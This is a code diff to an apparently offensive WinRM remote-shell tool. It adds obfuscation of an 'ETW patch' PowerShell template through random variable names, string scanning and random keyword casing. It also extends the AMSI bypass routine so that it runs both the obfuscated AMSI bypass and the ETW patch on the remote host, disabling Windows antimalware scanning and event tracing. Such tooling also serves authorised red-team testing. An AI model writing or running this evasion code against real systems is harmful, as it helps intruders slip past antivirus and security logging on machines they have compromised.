@@ -8,7 +8,7 @@ from typing import TYPE_CHECKING
 
 from devious_winrm.util.get_command_output import get_command_output
 from devious_winrm.util.misc import get_pwsh_script
-from devious_winrm.util.printers import print_error
+from devious_winrm.util.printers import print_error, print_info
 
 if TYPE_CHECKING:
     from psrp import SyncRunspacePool
@@ -185,6 +185,28 @@ def rand_casing_keywords(template: str) -> str:
 
     return KEYWORD_PATTERN.sub(replacement_func, template)
 
+def replace_func_var_name(template: str, function_name: str, replace_with: str) -> str:
+    """Replace the function variable name placeholders in the given template string.
+
+    Args:
+        template (str): The template string containing the\
+            function variable name placeholder.
+        function_name (str): The name of the function variable to be replaced.
+        replace_with (str): The string to replace the placeholder with. If not provided\
+            or empty, a random string of length 15 to 32 will be generated.
+
+    Returns:
+        str: The template string with the function variable name placeholder replaced\
+            by the specified string.
+
+    """
+    if not replace_with:
+        replace_with = random_string(random.randint(15, 32))
+
+    a_mark = ">><"
+    func_placeholder = f"{a_mark}{function_name}{a_mark}"
+    return replace_placeholder(template, func_placeholder, replace_with)
+
 def obfuscate_4msi_bypass() -> str:
     """Obfuscate the AMSI bypass script.
 
@@ -210,9 +232,27 @@ def obfuscate_4msi_bypass() -> str:
     result = replace_with_string_scan(result)
     return rand_casing_keywords(result)
 
+def obfuscate_etw_patch() -> str:
+    """Obfuscate the ETW patch script."""
+    result = get_pwsh_script("ETW-Patch.ps1.template")
+
+    replacement_str = f"${random_string(random.choice(range(7, 18)))}"
+    result = replace_func_var_name(result, "VAR1", replacement_str)
+    result = replace_with_string_scan(result)
+    return rand_casing_keywords(result)
+
 def bypass_amsi(rp: "SyncRunspacePool") -> None:
     """Bypass AMSI on the current RunspacePool."""
     amsi_bypass_script = obfuscate_4msi_bypass()
+    etw_patch_script = obfuscate_etw_patch()
+    print_info("Bypassing AMSI...")
     output = get_command_output(rp, amsi_bypass_script)
     if output:
         print_error(output)
+        return
+    print_info("Patching ETW...")
+    output = get_command_output(rp, etw_patch_script)
+    if output:
+            print_error(output)
+            return
+    print_info("AMSI and ETW sucessfuly patched.")
